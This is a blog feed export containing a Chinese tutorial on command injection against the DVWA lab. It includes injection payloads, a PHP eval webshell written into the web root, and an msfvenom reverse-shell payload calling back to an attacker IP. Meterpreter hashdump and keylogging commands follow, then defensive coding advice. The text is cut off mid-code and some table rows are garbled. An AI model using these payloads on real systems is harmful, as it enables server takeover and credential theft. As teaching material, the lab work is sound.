{
    "version": "https://jsonfeed.org/version/1",
    "title": "bae的博客 • All posts by \"漏洞利用\" category",
    "description": "bae的个人博客",
    "home_page_url": "https://bae-ace.github.io",
    "items": [
        {
            "id": "https://bae-ace.github.io/2025/07/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/",
            "url": "https://bae-ace.github.io/2025/07/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/",
            "title": "命令执行漏洞",
            "date_published": "2025-07-26T10:53:13.000Z",
            "content_html": "<h1 id=\"命令执行漏洞详解\"><a href=\"#命令执行漏洞详解\" class=\"headerlink\" title=\"命令执行漏洞详解\"></a>命令执行漏洞详解</h1><h2 id=\"🎯-前言\"><a href=\"#🎯-前言\" class=\"headerlink\" title=\"🎯 前言\"></a>🎯 前言</h2><p>命令执行漏洞是Web安全领域中的一种高危漏洞，它允许攻击者在目标服务器上执行任意系统命令。本文将深入解析命令执行漏洞的原理、成因、利用方法以及防护策略，并通过DVWA靶场环境进行实战演示。</p>\n<hr>\n<h2 id=\"📋-目录\"><a href=\"#📋-目录\" class=\"headerlink\" title=\"📋 目录\"></a>📋 目录</h2><ol>\n<li><a href=\"https://claude.ai/chat/d5068d44-b35a-4d8e-9e2d-89fe67d23495#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0\">漏洞概述</a></li>\n<li><a href=\"https://claude.ai/chat/d5068d44-b35a-4d8e-9e2d-89fe67d23495#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86\">漏洞原理</a></li>\n<li><a href=\"https://claude.ai/chat/d5068d44-b35a-4d8e-9e2d-89fe67d23495#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA\">环境搭建</a></li>\n<li><a href=\"https://claude.ai/chat/d5068d44-b35a-4d8e-9e2d-89fe67d23495#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98\">漏洞利用实战</a></li>\n<li><a href=\"https://claude.ai/chat/d5068d44-b35a-4d8e-9e2d-89fe67d23495#%E5%90%8E%E6%B8%97%E9%80%8F%E6%93%8D%E4%BD%9C\">后渗透操作</a></li>\n<li><a href=\"https://claude.ai/chat/d5068d44-b35a-4d8e-9e2d-89fe67d23495#%E9%98%B2%E6%8A%A4%E6%8E%AA%E6%96%BD\">防护措施</a></li>\n<li><a href=\"https://claude.ai/chat/d5068d44-b35a-4d8e-9e2d-89fe67d23495#%E6%80%BB%E7%BB%93\">总结</a></li>\n</ol>\n<hr>\n<h2 id=\"🔍-漏洞概述\"><a href=\"#🔍-漏洞概述\" class=\"headerlink\" title=\"🔍 漏洞概述\"></a>🔍 漏洞概述</h2><h3 id=\"什么是命令执行漏洞？\"><a href=\"#什么是命令执行漏洞？\" class=\"headerlink\" title=\"什么是命令执行漏洞？\"></a>什么是命令执行漏洞？</h3><p>命令执行漏洞（Command Execution&#x2F;Command Injection）是指当Web应用程序需要调用系统命令来完成某些功能时，由于对用户输入的过滤不严格，导致攻击者可以构造恶意的命令参数，从而在服务器上执行任意系统命令的安全漏洞。</p>\n<h3 id=\"漏洞危害\"><a href=\"#漏洞危害\" class=\"headerlink\" title=\"漏洞危害\"></a>漏洞危害</h3><ul>\n<li><strong>服务器完全控制</strong>：获得服务器的命令执行权限</li>\n<li><strong>数据泄露</strong>：访问敏感文件和数据库信息</li>\n<li><strong>权限提升</strong>：通过系统漏洞进一步提升权限</li>\n<li><strong>横向移动</strong>：以被攻陷服务器为跳板攻击内网其他系统</li>\n<li><strong>恶意软件植入</strong>：上传后门程序或恶意软件</li>\n</ul>\n<hr>\n<h2 id=\"⚙️-漏洞原理\"><a href=\"#⚙️-漏洞原理\" class=\"headerlink\" title=\"⚙️ 漏洞原理\"></a>⚙️ 漏洞原理</h2><h3 id=\"技术原理\"><a href=\"#技术原理\" class=\"headerlink\" title=\"技术原理\"></a>技术原理</h3><p>命令执行漏洞的根本原因在于应用程序直接将用户输入作为系统命令的参数，而没有进行适当的过滤和验证。</p>\n<h4 id=\"典型的脆弱代码示例：\"><a href=\"#典型的脆弱代码示例：\" class=\"headerlink\" title=\"典型的脆弱代码示例：\"></a>典型的脆弱代码示例：</h4><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br><span class=\"hljs-comment\">// 获取用户输入的IP地址</span><br><span class=\"hljs-variable\">$target</span> = <span class=\"hljs-variable\">$_REQUEST</span>[<span class=\"hljs-string\">&#x27;ip&#x27;</span>];<br><br><span class=\"hljs-comment\">// 直接将用户输入拼接到系统命令中</span><br><span class=\"hljs-variable\">$cmd</span> = <span class=\"hljs-title function_ invoke__\">shell_exec</span>(<span class=\"hljs-string\">&#x27;ping -c 4 &#x27;</span> . <span class=\"hljs-variable\">$target</span>);<br><br><span class=\"hljs-comment\">// 输出结果</span><br><span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&quot;&lt;pre&gt;<span class=\"hljs-subst\">$cmd</span>&lt;/pre&gt;&quot;</span>;<br><span class=\"hljs-meta\">?&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"命令连接符\"><a href=\"#命令连接符\" class=\"headerlink\" title=\"命令连接符\"></a>命令连接符</h3><p>攻击者通常利用以下命令连接符来注入恶意命令：</p>\n<table>\n<thead>\n<tr>\n<th>连接符</th>\n<th>说明</th>\n<th>示例</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>;</code></td>\n<td>命令分隔符</td>\n<td><code>127.0.0.1; whoami</code></td>\n</tr>\n<tr>\n<td><code>&amp;&amp;</code></td>\n<td>逻辑与，前一个命令成功后执行后一个</td>\n<td><code>127.0.0.1 &amp;&amp; whoami</code></td>\n</tr>\n<tr>\n<td>&#96;</td>\n<td></td>\n<td>&#96;</td>\n</tr>\n<tr>\n<td>&#96;</td>\n<td>&#96;</td>\n<td>管道符，将前一个命令的输出作为后一个命令的输入</td>\n</tr>\n<tr>\n<td><code>&amp;</code></td>\n<td>后台执行</td>\n<td><code>127.0.0.1 &amp; whoami</code></td>\n</tr>\n<tr>\n<td><code>$()</code></td>\n<td>命令替换</td>\n<td><code>127.0.0.1$(whoami)</code></td>\n</tr>\n<tr>\n<td><code> </code></td>\n<td>反引号命令替换</td>\n<td><code>127.0.0.1</code>whoami<code> </code></td>\n</tr>\n</tbody></table>\n<hr>\n<h2 id=\"🌐-环境搭建\"><a href=\"#🌐-环境搭建\" class=\"headerlink\" title=\"🌐 环境搭建\"></a>🌐 环境搭建</h2><h3 id=\"靶场环境配置\"><a href=\"#靶场环境配置\" class=\"headerlink\" title=\"靶场环境配置\"></a>靶场环境配置</h3><p><strong>系统环境：</strong></p>\n<ul>\n<li>操作系统：Windows 7</li>\n<li>Web服务器：PHPStudy</li>\n<li>靶场程序：DVWA</li>\n<li>DVWA路径：<code>C:\\download\\phpstudy\\phpstudy_pro\\WWW\\DVWA</code></li>\n<li>访问地址：<code>http://192.168.147.136/DVWA/</code></li>\n</ul>\n<h3 id=\"环境准备步骤\"><a href=\"#环境准备步骤\" class=\"headerlink\" title=\"环境准备步骤\"></a>环境准备步骤</h3><ol>\n<li><strong>安装PHPStudy</strong><ul>\n<li>下载并安装PHPStudy集成环境</li>\n<li>启动Apache和MySQL服务</li>\n</ul>\n</li>\n<li><strong>部署DVWA</strong><ul>\n<li>下载DVWA源码</li>\n<li>解压到PHPStudy的WWW目录</li>\n<li>配置数据库连接</li>\n</ul>\n</li>\n<li><strong>设置安全等级</strong><ul>\n<li>登录DVWA管理界面</li>\n<li>导航至DVWA Security</li>\n<li>将安全等级设置为Low</li>\n</ul>\n</li>\n</ol>\n<hr>\n<h2 id=\"💥-漏洞利用实战\"><a href=\"#💥-漏洞利用实战\" class=\"headerlink\" title=\"💥 漏洞利用实战\"></a>💥 漏洞利用实战</h2><h3 id=\"第一步：访问漏洞页面\"><a href=\"#第一步：访问漏洞页面\" class=\"headerlink\" title=\"第一步：访问漏洞页面\"></a>第一步：访问漏洞页面</h3><p>打开浏览器访问命令执行漏洞测试页面：</p>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs awk\">http:<span class=\"hljs-regexp\">//</span><span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">147.136</span><span class=\"hljs-regexp\">/DVWA/</span>vulnerabilities<span class=\"hljs-regexp\">/exec/</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"第二步：基础命令注入测试\"><a href=\"#第二步：基础命令注入测试\" class=\"headerlink\" title=\"第二步：基础命令注入测试\"></a>第二步：基础命令注入测试</h3><p>在输入框中输入以下Payload进行测试：</p>\n<figure class=\"highlight accesslog\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs accesslog\"><span class=\"hljs-number\">127.0.0.1</span> &amp;&amp; whoami<br></code></pre></td></tr></table></figure>\n\n<p><strong>预期结果：</strong></p>\n<figure class=\"highlight routeros\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs routeros\">PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.<br>64 bytes <span class=\"hljs-keyword\">from</span> 127.0.0.1: <span class=\"hljs-attribute\">icmp_seq</span>=1 <span class=\"hljs-attribute\">ttl</span>=64 <span class=\"hljs-attribute\">time</span>=0.042 ms<br><span class=\"hljs-built_in\">..</span>.<br><br>nt authority\\system<br></code></pre></td></tr></table></figure>\n\n<p>如果看到<code>nt authority\\system</code>输出，说明命令注入成功！</p>\n<h3 id=\"第三步：信息收集\"><a href=\"#第三步：信息收集\" class=\"headerlink\" title=\"第三步：信息收集\"></a>第三步：信息收集</h3><p>使用不同的命令收集系统信息：</p>\n<figure class=\"highlight ruby\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs ruby\"><span class=\"hljs-comment\"># 查看当前用户</span><br><span class=\"hljs-number\">127.0</span>.<span class=\"hljs-number\">0.1</span> &amp;&amp; whoami<br><br><span class=\"hljs-comment\"># 查看系统信息</span><br><span class=\"hljs-number\">127.0</span>.<span class=\"hljs-number\">0.1</span> &amp;&amp; systeminfo<br><br><span class=\"hljs-comment\"># 查看网络配置</span><br><span class=\"hljs-number\">127.0</span>.<span class=\"hljs-number\">0.1</span> &amp;&amp; ipconfig<br><br><span class=\"hljs-comment\"># 查看当前目录</span><br><span class=\"hljs-number\">127.0</span>.<span class=\"hljs-number\">0.1</span> &amp;&amp; dir<br><br><span class=\"hljs-comment\"># 查看进程列表</span><br><span class=\"hljs-number\">127.0</span>.<span class=\"hljs-number\">0.1</span> &amp;&amp; tasklist<br></code></pre></td></tr></table></figure>\n\n<hr>\n<h2 id=\"🎯-后渗透操作\"><a href=\"#🎯-后渗透操作\" class=\"headerlink\" title=\"🎯 后渗透操作\"></a>🎯 后渗透操作</h2><h3 id=\"方法一：上传Webshell\"><a href=\"#方法一：上传Webshell\" class=\"headerlink\" title=\"方法一：上传Webshell\"></a>方法一：上传Webshell</h3><h4 id=\"1-准备一句话木马\"><a href=\"#1-准备一句话木马\" class=\"headerlink\" title=\"1. 准备一句话木马\"></a>1. 准备一句话木马</h4><p>创建<code>shell.php</code>文件：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span> @<span class=\"hljs-keyword\">eval</span>(<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">&#x27;pass&#x27;</span>]); <span class=\"hljs-meta\">?&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>或者使用Base64编码版本：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span> <span class=\"hljs-keyword\">eval</span>(<span class=\"hljs-title function_ invoke__\">base64_decode</span>(<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">&#x27;cmd&#x27;</span>])); <span class=\"hljs-meta\">?&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h4 id=\"2-通过命令注入上传\"><a href=\"#2-通过命令注入上传\" class=\"headerlink\" title=\"2. 通过命令注入上传\"></a>2. 通过命令注入上传</h4><p>使用echo命令写入一句话木马：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-number\">127.0</span>.<span class=\"hljs-number\">0.1</span> &amp;&amp; <span class=\"hljs-keyword\">echo</span> ^<span class=\"hljs-meta\">&lt;?php</span> @<span class=\"hljs-keyword\">eval</span>(<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">&#x27;pass&#x27;</span>]); ?^&gt; &gt; C:\\download\\phpstudy\\phpstudy_pro\\WWW\\DVWA\\shell.php<br></code></pre></td></tr></table></figure>\n\n<p><strong>注意事项：</strong></p>\n<ul>\n<li><code>^</code>符号是Windows cmd的转义符</li>\n<li><code>&gt;</code>符号用于重定向输出到文件</li>\n<li>路径必须是Web目录下可访问的位置</li>\n</ul>\n<h4 id=\"3-验证上传成功\"><a href=\"#3-验证上传成功\" class=\"headerlink\" title=\"3. 验证上传成功\"></a>3. 验证上传成功</h4><p>访问上传的木马文件：</p>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs awk\">http:<span class=\"hljs-regexp\">//</span><span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">147.136</span><span class=\"hljs-regexp\">/DVWA/</span>shell.php<br></code></pre></td></tr></table></figure>\n\n<p>如果页面显示空白，说明PHP文件上传成功。</p>\n<h3 id=\"方法二：使用蚁剑连接\"><a href=\"#方法二：使用蚁剑连接\" class=\"headerlink\" title=\"方法二：使用蚁剑连接\"></a>方法二：使用蚁剑连接</h3><h4 id=\"1-配置蚁剑连接\"><a href=\"#1-配置蚁剑连接\" class=\"headerlink\" title=\"1. 配置蚁剑连接\"></a>1. 配置蚁剑连接</h4><p><strong>连接参数：</strong></p>\n<ul>\n<li>URL: <code>http://192.168.147.136/DVWA/shell.php</code></li>\n<li>密码: <code>pass</code></li>\n<li>编码: <code>UTF-8</code></li>\n<li>类型: <code>PHP</code></li>\n</ul>\n<h4 id=\"2-功能演示\"><a href=\"#2-功能演示\" class=\"headerlink\" title=\"2. 功能演示\"></a>2. 功能演示</h4><p>通过蚁剑可以实现：</p>\n<ul>\n<li>文件管理：浏览、上传、下载、编辑文件</li>\n<li>数据库管理：连接和操作数据库</li>\n<li>虚拟终端：执行系统命令</li>\n<li>反向代理：建立隧道连接</li>\n</ul>\n<h3 id=\"方法三：MSF提权操作\"><a href=\"#方法三：MSF提权操作\" class=\"headerlink\" title=\"方法三：MSF提权操作\"></a>方法三：MSF提权操作</h3><h4 id=\"1-生成Meterpreter木马\"><a href=\"#1-生成Meterpreter木马\" class=\"headerlink\" title=\"1. 生成Meterpreter木马\"></a>1. 生成Meterpreter木马</h4><p>在Kali Linux中执行：</p>\n<figure class=\"highlight zsh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs zsh\">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.147.129 LPORT=4444 -f exe &gt; shell.exe<br></code></pre></td></tr></table></figure>\n\n<p><strong>参数说明：</strong></p>\n<ul>\n<li><code>-p</code>: 指定Payload类型</li>\n<li><code>LHOST</code>: 攻击者IP地址</li>\n<li><code>LPORT</code>: 监听端口</li>\n<li><code>-f</code>: 输出格式</li>\n</ul>\n<h4 id=\"2-上传木马文件\"><a href=\"#2-上传木马文件\" class=\"headerlink\" title=\"2. 上传木马文件\"></a>2. 上传木马文件</h4><p>通过蚁剑将生成的<code>shell.exe</code>上传到目标服务器：</p>\n<figure class=\"highlight basic\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs basic\">C:\\Users\\Public\\<span class=\"hljs-keyword\">shell</span>.exe<br></code></pre></td></tr></table></figure>\n\n<h4 id=\"3-配置MSF监听器\"><a href=\"#3-配置MSF监听器\" class=\"headerlink\" title=\"3. 配置MSF监听器\"></a>3. 配置MSF监听器</h4><p>启动Metasploit：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">msfconsole<br></code></pre></td></tr></table></figure>\n\n<p>配置监听器：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">use exploit/multi/handler<br><span class=\"hljs-built_in\">set</span> payload windows/meterpreter/reverse_tcp<br><span class=\"hljs-built_in\">set</span> lhost 192.168.147.129<br><span class=\"hljs-built_in\">set</span> lport 4444<br>exploit<br></code></pre></td></tr></table></figure>\n\n<h4 id=\"4-执行木马获取Meterpreter会话\"><a href=\"#4-执行木马获取Meterpreter会话\" class=\"headerlink\" title=\"4. 执行木马获取Meterpreter会话\"></a>4. 执行木马获取Meterpreter会话</h4><p>在蚁剑终端或通过命令注入执行：</p>\n<figure class=\"highlight vbnet\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs vbnet\"><span class=\"hljs-symbol\">C:</span>\\Users\\<span class=\"hljs-keyword\">Public</span>\\shell.exe<br></code></pre></td></tr></table></figure>\n\n<p>成功建立连接后，可以使用Meterpreter的强大功能：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\"><span class=\"hljs-meta prompt_\"># </span><span class=\"language-bash\">获取系统信息</span><br>sysinfo<br><span class=\"hljs-meta prompt_\"></span><br><span class=\"hljs-meta prompt_\"># </span><span class=\"language-bash\">获取用户权限</span><br>getuid<br><span class=\"hljs-meta prompt_\"></span><br><span class=\"hljs-meta prompt_\"># </span><span class=\"language-bash\">提权到SYSTEM</span><br>getsystem<br><span class=\"hljs-meta prompt_\"></span><br><span class=\"hljs-meta prompt_\"># </span><span class=\"language-bash\">获取密码哈希</span><br>hashdump<br><span class=\"hljs-meta prompt_\"></span><br><span class=\"hljs-meta prompt_\"># </span><span class=\"language-bash\">截屏</span><br>screenshot<br><span class=\"hljs-meta prompt_\"></span><br><span class=\"hljs-meta prompt_\"># </span><span class=\"language-bash\">键盘记录</span><br>keyscan_start<br></code></pre></td></tr></table></figure>\n\n<hr>\n<h2 id=\"🛡️-防护措施\"><a href=\"#🛡️-防护措施\" class=\"headerlink\" title=\"🛡️ 防护措施\"></a>🛡️ 防护措施</h2><h3 id=\"输入验证和过滤\"><a href=\"#输入验证和过滤\" class=\"headerlink\" title=\"输入验证和过滤\"></a>输入验证和过滤</h3><h4 id=\"1-白名单验证\"><a href=\"#1-白名单验证\" class=\"headerlink\" title=\"1. 白名单验证\"></a>1. 白名单验证</h4><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br><span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">validateIP</span>(<span class=\"hljs-params\"><span class=\"hljs-variable\">$ip</span></span>) </span>&#123;<br>    <span class=\"hljs-comment\">// 使用白名单验证IP地址格式</span><br>    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-title function_ invoke__\">filter_var</span>(<span class=\"hljs-variable\">$ip</span>, FILTER_VALIDATE_IP)) &#123;<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-variable\">$ip</span>;<br>    &#125;<br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">false</span>;<br>&#125;<br><br><span class=\"hljs-variable\">$target</span> = <span class=\"hljs-variable\">$_REQUEST</span>[<span class=\"hljs-string\">&#x27;ip&#x27;</span>];<br><span class=\"hljs-variable\">$validIP</span> = <span class=\"hljs-title function_ invoke__\">validateIP</span>(<span class=\"hljs-variable\">$target</span>);<br><br><span class=\"hljs-keyword\">if</span> (<span class=\"hljs-variable\">$validIP</span>) &#123;<br>    <span class=\"hljs-variable\">$cmd</span> = <span class=\"hljs-title function_ invoke__\">shell_exec</span>(<span class=\"hljs-string\">&#x27;ping -c 4 &#x27;</span> . <span class=\"hljs-title function_ invoke__\">escapeshellarg</span>(<span class=\"hljs-variable\">$validIP</span>));<br>&#125; <span class=\"hljs-keyword\">else</span> &#123;<br>    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&quot;Invalid IP address&quot;</span>;<br>&#125;<br><span class=\"hljs-meta\">?&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h4 id=\"2-特殊字符过滤\"><a href=\"#2-特殊字符过滤\" class=\"headerlink\" title=\"2. 特殊字符过滤\"></a>2. 特殊字符过滤</h4><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br><span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">filterDangerousChars</span>(<span class=\"hljs-params\"><span class=\"hljs-variable\">$input</span></span>) </span>&#123;<br>    <span class=\"hljs-comment\">// 过滤危险字符</span><br>    <span class=\"hljs-variable\">$dangerous</span> = <span class=\"hljs-keyword\">array</span>(<span class=\"hljs-string\">&#x27;;&#x27;</span>, <span class=\"hljs-string\">&#x27;&amp;&#x27;</span>, <span class=\"hljs-string\">&#x27;|&#x27;</span>, <span class=\"hljs-string\">&#x27;`&#x27;</span>, <span class=\"hljs-string\">&#x27;$&#x27;</span>, <span class=\"hljs-string\">&#x27;(&#x27;</span>, <span class=\"hljs-string\">&#x27;)&#x27;</span>, <span class=\"hljs-string\">&#x27;&#123;&#x27;</span>, <span class=\"hljs-string\">&#x27;&#125;&#x27;</span>, <span class=\"hljs-string\">&#x27;[&#x27;</span>, <span class=\"hljs-string\">&#x27;]&#x27;</span>, <span class=\"hljs-string\">&#x27;&lt;&#x27;</span>, <span class=\"hljs-string\">&#x27;&gt;&#x27;</span>);<br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-title function_ invoke__\">str_replace</span>(<span class=\"hljs-variable\">$dangerous</span>, <span class=\"hljs-string\">&#x27;&#x27;</span>, <span class=\"hljs-variable\">$input</span>);<br>&#125;<br><span class=\"hljs-meta\">?&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"使用安全的API\"><a href=\"#使用安全的API\" class=\"headerlink\" title=\"使用安全的API\"></a>使用安全的API</h3><h4 id=\"避免直接调用系统命令\"><a href=\"#避免直接调用系统命令\" class=\"headerlink\" title=\"避免直接调用系统命令\"></a>避免直接调用系统命令</h4><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br><span class=\"hljs-comment\">// 不安全的方式</span><br><span class=\"hljs-variable\">$cmd</span> = <span class=\"hljs-title function_ invoke__\">shell_exec</span>(<span class=\"hljs-string\">&#x27;ping -c 4 &#x27;</span> . <span class=\"hljs-variable\">$target</span>);<br><br><span class=\"hljs-comment\">// 安全的方式：使用专门的函数</span><br><span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">securePing</span>(<span class=\"hljs-params\"><span class=\"hljs-variable\">$ip</span></span>) </span>&#123;<br>    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-title function_ invoke__\">filter_var</span>(<span class=\"hljs-variable\">$ip</span>, FILTER_VALIDATE_IP)) &#123;<br>        <span class=\"hljs-comment\">// 使用socket或其他安全方式实现ping功能</span><br>        <span class=\"hljs-comment\">// 而不是直接调用系统命令</span><br>    &#125;<br>&#125;<br><span class=\"hljs-meta\">?&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"权限控制\"><a href=\"#权限控制\" class=\"headerlink\" title=\"权限控制\"></a>权限控制</h3><ol>\n<li><strong>最小权限原则</strong>：Web应用程序应该以最小权限用户运行</li>\n<li><strong>禁用危险函数</strong>：在php.ini中禁用<code>exec</code>, <code>shell_exec</code>, <code>system</code>等函数</li>\n<li><strong>沙箱环境</strong>：将Web应用程序运行在受限的环境中</li>\n</ol>\n<h3 id=\"代码审计\"><a href=\"#代码审计\" class=\"headerlink\" title=\"代码审计\"></a>代码审计</h3><p>定期进行代码安全审计，重点关注：</p>\n<ul>\n<li>用户输入处理</li>\n<li>系统命令调用</li>\n<li>文件操作</li>\n<li>数据库查询</li>\n</ul>\n<hr>\n<h2 id=\"📊-安全等级分析\"><a href=\"#📊-安全等级分析\" class=\"headerlink\" title=\"📊 安全等级分析\"></a>📊 安全等级分析</h2><h3 id=\"DVWA各安全等级的防护机制\"><a href=\"#DVWA各安全等级的防护机制\" class=\"headerlink\" title=\"DVWA各安全等级的防护机制\"></a>DVWA各安全等级的防护机制</h3><h4 id=\"Low级别\"><a href=\"#Low级别\" class=\"headerlink\" title=\"Low级别\"></a>Low级别</h4><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br><span class=\"hljs-comment\">// 完全没有过滤</span><br><span class=\"hljs-variable\">$target</span> = <span class=\"hljs-variable\">$_REQUEST</span>[<span class=\"hljs-string\">&#x27;ip&#x27;</span>];<br><span class=\"hljs-variable\">$cmd</span> = <span class=\"hljs-title function_ invoke__\">shell_exec</span>(<span class=\"hljs-string\">&#x27;ping -c 4 &#x27;</span> . <span class=\"hljs-variable\">$target</span>);<br><span class=\"hljs-meta\">?&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h4 id=\"Medium级别\"><a href=\"#Medium级别\" class=\"headerlink\" title=\"Medium级别\"></a>Medium级别</h4><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br><span class=\"hljs-comment\">// 简单的黑名单过滤</span><br><span class=\"hljs-variable\">$target</span> = <span class=\"hljs-variable\">$_REQUEST</span>[<span class=\"hljs-string\">&#x27;ip&#x27;</span>];<br><span class=\"hljs-variable\">$target</span> = <span class=\"hljs-title function_ invoke__\">str_replace</span>(<span class=\"hljs-keyword\">array</span>(<span class=\"hljs-string\">&#x27;&amp;&amp;&#x27;</span>, <span class=\"hljs-string\">&#x27;;&#x27;</span>), <span 